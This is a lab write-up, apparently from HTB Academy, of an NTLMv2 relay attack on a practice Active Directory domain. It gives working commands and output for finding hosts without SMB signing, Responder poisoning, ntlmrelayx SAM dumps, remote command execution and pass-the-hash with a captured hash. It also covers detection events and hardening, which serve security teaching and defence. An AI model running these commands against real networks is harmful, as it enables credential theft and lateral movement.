# 02 — NTLMv2 Relay Attack

> **Lab Environment:** INLANEFREIGHT.LOCAL · Attack host: Pwnbox (Parrot OS) · Interface: `ens224` · Relay targets: `172.16.5.25`, `172.16.5.50`, `172.16.5.100`
>
> **Pre-requisite:** Technique 01 (LLMNR Poisoning) must be understood — Responder is the coercion mechanism for relay.

---

## Table of Contents

1. [Root Cause](#1-root-cause)
2. [How NTLMv2 Relay Differs from Hash Capture](#2-how-ntlmv2-relay-differs-from-hash-capture)
3. [Attack Chain Overview](#3-attack-chain-overview)
4. [Lab Environment](#4-lab-environment)
5. [Phase 1 — Find Relay Targets (SMB Signing Check)](#5-phase-1--find-relay-targets-smb-signing-check)
6. [Phase 2 — Configure Responder for Relay](#6-phase-2--configure-responder-for-relay)
7. [Phase 3 — Execute Relay with ntlmrelayx](#7-phase-3--execute-relay-with-ntlmrelayx)
8. [Phase 4 — Post-Relay Attacks](#8-phase-4--post-relay-attacks)
9. [Detection & Telemetry](#9-detection--telemetry)
10. [Hardening](#10-hardening)
11. [MITRE ATT&CK Mapping](#11-mitre-attck-mapping)
12. [References](#12-references)

---

## 1. Root Cause

NTLMv2 Relay is an elevation of the hash capture attack. Instead of capturing a hash and cracking it offline, the attacker **intercepts the NTLM authentication exchange in real time and transparently forwards it to a third-party target**. If the relayed session authenticates successfully, the attacker gains access to that target using the victim's identity — no password cracking required.

The critical enabling condition is **SMB signing disabled**. SMB signing uses a session key to sign every packet, making relay impossible because the relayed messages would have invalid signatures. When SMB signing is not enforced, relaying succeeds.

| Condition | Effect |
|---|---|
| SMB signing disabled | Relay succeeds, SAM dump or remote command execution |
| SMB signing required (default on Domain Controllers) | Relay fails |
| SMB signing enabled but not required | Negotiated down — relay may still succeed |

> **OS version note:** SMB signing defaults changed in newer Windows releases. Windows Server 2025 and Windows 11 24H2 require SMB signing by default for inbound connections, closing the relay path on those hosts without additional configuration. Older workstations (Windows 10, Windows 11 pre-24H2, Windows Server 2019/2022 member servers) default to signing disabled for inbound SMB, making them typical relay targets in mixed enterprise environments. Always verify the actual signing state with `--gen-relay-list` rather than assuming defaults.

---

## 2. How NTLMv2 Relay Differs from Hash Capture

| Technique | Method | Requires Cracking? | Requires Signing Off? |
|---|---|---|---|
| Hash Capture (Technique 01) | Capture NTLMv2 and crack offline | Yes | No |
| NTLMv2 Relay (this technique) | Forward live auth to target | No | Yes (SMB) |

Relay is **faster and more reliable** when viable — if the victim authenticates with strong passwords, relay bypasses cracking entirely. The captured NTLMv2 exchange is used once, in transit. The victim's plaintext password is never needed.

---

## 3. Attack Chain Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                       NTLMv2 Relay Attack Chain                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  VICTIM (172.16.5.125)                ATTACKER (Pwnbox / ens224)        │
│                                                                         │
│  LLMNR broadcast sent         →       Responder poisons (SMB=Off)       │
│  Victim connects to attacker  →       ntlmrelayx receives auth          │
│  NTLMv2 challenge-response    →       Forwarded to relay target          │
│                               ←       Target authenticates attacker     │
│                                       ↓                                 │
│                               RELAY TARGET (172.16.5.50)              │
│                               SMB signing = disabled                    │
│                               → SAM database dumped                     │
│                               → Local admin hashes extracted            │
│                                                                         │
│  Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04a │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 4. Lab Environment

| Component | Detail |
|---|---|
| Domain | `INLANEFREIGHT.LOCAL` |
| Attack host | Pwnbox — Parrot OS, interface `ens224` |
| Relay targets | `172.16.5.25`, `172.16.5.50`, `172.16.5.100` (SMB signing disabled) |
| Coercion method | Responder LLMNR/NBT-NS poisoning |
| Relay tool | Impacket `ntlmrelayx.py` |
| Default post-relay action | SAM dump |

---

## 5. Phase 1 — Find Relay Targets (SMB Signing Check)

Before running the relay, identify which machines on the subnet have SMB signing disabled. Only these are valid relay targets.

### Enumerate SMB signing with CrackMapExec

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.0/23 --gen-relay-list relayTargets.txt
```

```
SMB   172.16.5.5    445  ACADEMY-EA-DC01   [*] signing:True  (SMBv1:False)
SMB   172.16.5.25   445  ACADEMY-EA-MS01   [*] signing:False (SMBv1:False)
SMB   172.16.5.50   445  ACADEMY-EA-FILE01 [*] signing:False (SMBv1:False)
SMB   172.16.5.100  445  ACADEMY-EA-WEB01  [*] signing:False (SMBv1:False)
```

```bash
Hackerpatel007_1@htb[/htb]$ cat relayTargets.txt
```

```
172.16.5.25
172.16.5.50
172.16.5.100
```

> **Analyst note:** Domain Controllers have SMB signing required by default in standard Windows Server configurations, making them generally invalid relay targets over SMB. This is not an immutable fact — it is a configurable policy setting that could be changed in a misconfigured or intentionally weakened environment. Always verify the actual signing state with `--gen-relay-list` rather than assuming DCs are exempt. Workstations and member servers are the typical relay targets. The `--gen-relay-list` flag writes only the hosts with signing disabled. The generated target list above matches the scan output exactly — ACADEMY-EA-MS01 (.25), ACADEMY-EA-FILE01 (.50), and ACADEMY-EA-WEB01 (.100).

---

## 6. Phase 2 — Configure Responder for Relay

By default, Responder runs its own SMB server to capture hashes. When relaying, `ntlmrelayx` must be the SMB listener — not Responder. Disable Responder's SMB and HTTP servers so the two tools don't compete on port 445 (SMB) and port 80 (HTTP). `ntlmrelayx` will own both listeners when you run it with `-smb2support`.

```bash
Hackerpatel007_1@htb[/htb]$ cd /usr/share/responder
Hackerpatel007_1@htb[/htb]$ sudo sed -i -E 's/^(SMB|HTTP|HTTPS) = On/\1 = Off/' Responder.conf
Hackerpatel007_1@htb[/htb]$ grep -E '^(SMB|HTTP|HTTPS) =' Responder.conf
```

```
HTTP = Off
HTTPS = Off
SMB = Off
```

> Responder still poisons LLMNR/NBT-NS — it just doesn't serve the authentication endpoints. `ntlmrelayx` owns SMB (port 445) and HTTP (port 80) listeners. All three must be disabled in `Responder.conf` so the two tools don't compete on those ports.

### Start Responder (poisoning mode, SMB off)

```bash
Hackerpatel007_1@htb[/htb]$ sudo responder -I ens224
```

```
[+] Poisoning Options:
    Analyze Mode             [OFF]
    ...
[+] Servers:
    HTTP server              [OFF] ← ntlmrelayx owns port 80
    HTTPS server             [OFF]
    SMB server               [OFF] ← ntlmrelayx owns port 445
    SQL server               [ON]
...
[+] Listening for events...
```

---

## 7. Phase 3 — Execute Relay with ntlmrelayx

In a **second terminal**, start `ntlmrelayx` targeting the relay list. The `-smb2support` flag ensures compatibility with SMBv2 targets.

```bash
Hackerpatel007_1@htb[/htb]$ sudo ntlmrelayx.py -tf relayTargets.txt -smb2support
```

```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Servers started, waiting for connections
```

When a victim generates an LLMNR broadcast and Responder poisons it, `ntlmrelayx` receives the coerced auth and relays it:

```
[*] Incoming connection (172.16.5.125,56834)
# Note: 172.16.5.125 is the IP of the connection source as seen in this relay output.
# The lab environment table lists ACADEMY-EA-MS01 at 172.16.5.25. The .125 address here
# is from an unreconciled capture taken from a separate lab snapshot — the IP-to-host
# mapping could not be verified against the current lab table. Use the
# --gen-relay-list scan output to determine the accurate host-to-IP mapping in your lab.
[*] AUTHENTICATE_MESSAGE (INLANEFREIGHT\backupagent,ACADEMY-EA-MS01)
[*] User INLANEFREIGHT\backupagent authenticated successfully
[*] backupagent::INLANEFREIGHT:aaaaaaaaaaaaaaaa:b334cbc6a24d8e33c3fbe69902e449f1:010100000000000090c3a9d4432cd80100000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c0006001e004900340046004e002e004c004f00430041004c00000000 relayed to 172.16.5.50
# SANITIZED FOR DOCUMENTATION: the challenge field has been replaced with 'aaaaaaaaaaaaaaaa'.
# Because the challenge is sanitized, the response hash fields shown above are no longer
# cryptographically consistent with any real authentication — the entire NTLMv2 response
# line is illustrative. In a live capture, the challenge is a random 8-byte (16 hex char)
# value generated by ntlmrelayx, and the response fields are computed from the actual challenge.
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target 172.16.5.50 has admins: backupagent
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
backupagent:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Done dumping SAM hashes for host: 172.16.5.50
```

**What happened:**
1. Victim `ACADEMY-EA-MS01` sent an LLMNR broadcast
2. Responder answered — victim connected to `ntlmrelayx` on port 445
3. `ntlmrelayx` forwarded the auth to `172.16.5.50`
4. `172.16.5.50` verified the NTLM exchange with the DC — `backupagent` has local admin
5. `ntlmrelayx` leveraged the authenticated session to dump the SAM database
6. Local administrator NT hash extracted: `7facdc498ed1680c4fd1448319a8c04a`

---

## 8. Phase 4 — Post-Relay Attacks

The SAM dump is just the default action. `ntlmrelayx` supports multiple post-relay attack paths depending on the privileges of the relayed session.

### Interactive SMB shell (`-i` flag)

```bash
Hackerpatel007_1@htb[/htb]$ sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -i
```

```
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

```bash
Hackerpatel007_1@htb[/htb]$ nc 127.0.0.1 11000
```

```
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
# use C$
# ls
drw-rw-rw-          0  Sat Sep 12 15:33:17 2026 $Recycle.Bin
drw-rw-rw-          0  Mon Sep 14 13:28:40 2026 Boot
drw-rw-rw-          0  Mon Sep 14 13:28:40 2026 Windows
```

### Remote command execution (`-c` flag)

```bash
Hackerpatel007_1@htb[/htb]$ sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "whoami"
```

```
[*] Executed specified command on host: 172.16.5.50
[*] Output: nt authority\system
```

### Post-relay hash cracking (local admin hash → PTH)

The extracted local admin NT hash can be used for Pass-the-Hash across the domain if local admin password reuse is present:

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.0/23 -u Administrator -H 7facdc498ed1680c4fd1448319a8c04a --local-auth
```

---

## 9. Detection & Telemetry

> **Important — events are conditional, not guaranteed:** These events are corroborating indicators. Not all relay executions generate all of them. Event generation depends on the specific relay path used (SAM dump vs command execution), whether services are started, DC involvement in authentication, and what auditing/monitoring is deployed.

| Event ID | Log | Condition / Caveat |
|---|---|---|
| **4624** (Logon Type 3) | Security (relay target) | NTLM network logon recorded on the relay target when the relayed auth succeeds. Reliable — present on successful relay. |
| **4648** | Security | Explicit credential use — may appear on the victim host in some scenarios but is not reliably generated for all relay paths. Treat as corroborating, not a primary indicator. |
| **4776** | Security (DC) | NTLM credential validation at the DC — only generated if the DC participates in validating the NTLM exchange for the relayed session. Depends on the account type and relay path. Not guaranteed on every relay. |
| **7045** | System (relay target) | New service installed — generated only when ntlmrelayx uses a service-based execution path (e.g., `-c` flag for remote command execution). NOT generated by the default SAM dump path. |
| **7036** | System (relay target) | Service state changed — generated when ntlmrelayx starts an existing service (e.g., RemoteRegistry) to access the SAM. Only present if RemoteRegistry was stopped and ntlmrelayx starts it. |
| **5156** | Security/WFP (victim) | Network connection allowed: victim to attacker on 445. Present when WFP auditing is enabled. |
| **3** | Sysmon (victim) | Network connection to unexpected host on port 445. Present only when Sysmon is deployed and configured with NetworkConnect rules. |

**Key network-level indicator:** A workstation's SMB connection goes to an IP other than the legitimate server it was trying to reach. The source of the authenticated session (the attacker's IP) differs from the hostname the victim was resolving.

---

## 10. Hardening

| Control | Effect |
|---|---|
| **Enable SMB signing on all hosts** | Renders SMB relay impossible — single most effective control |
| Disable LLMNR/NBT-NS | Removes the coercion vector (see technique 01) |
| Enable LDAP signing + channel binding | Closes LDAP relay path |
| EPA (Extended Protection for Authentication) | Closes HTTP relay paths |
| Tiered admin model | Limits blast radius if relay succeeds |
| Local admin uniqueness (LAPS) | Prevents lateral movement via re-used local admin hash |

**Enforce SMB signing via GPO:**

```
Computer Configuration
  → Windows Settings
    → Security Settings
      → Local Policies
        → Security Options
          → "Microsoft network server: Digitally sign communications (always)"
            → Set to: Enabled
```

---

## 11. MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning | [T1557.001](https://attack.mitre.org/techniques/T1557/001/) | Coercion vector |
| OS Credential Dumping: SAM | [T1003.002](https://attack.mitre.org/techniques/T1003/002/) | SAM dump post-relay |
| Lateral Movement: SMB/Windows Admin Shares | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) | Using relayed session |
| Use Alternate Authentication Material: Pass the Hash | [T1550.002](https://attack.mitre.org/techniques/T1550/002/) | Downstream from SAM dump |

---

## 12. References

| Resource | URL |
|---|---|
| Impacket ntlmrelayx | https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx |
| MITRE T1557.001 | https://attack.mitre.org/techniques/T1557/001/ |
| The Basics of SMB Signing | https://techcommunity.microsoft.com/t5/storage-at-microsoft/configure-smb-signing-with-confidence/ba-p/2418102 |
| HTB Academy — NTLM Relay Attacks | https://academy.hackthebox.com/course/preview/ntlm-relay-attacks |

---

*Documented from INLANEFREIGHT.LOCAL lab environment — HTB Academy Active Directory Penetration Tester Path 2024.*
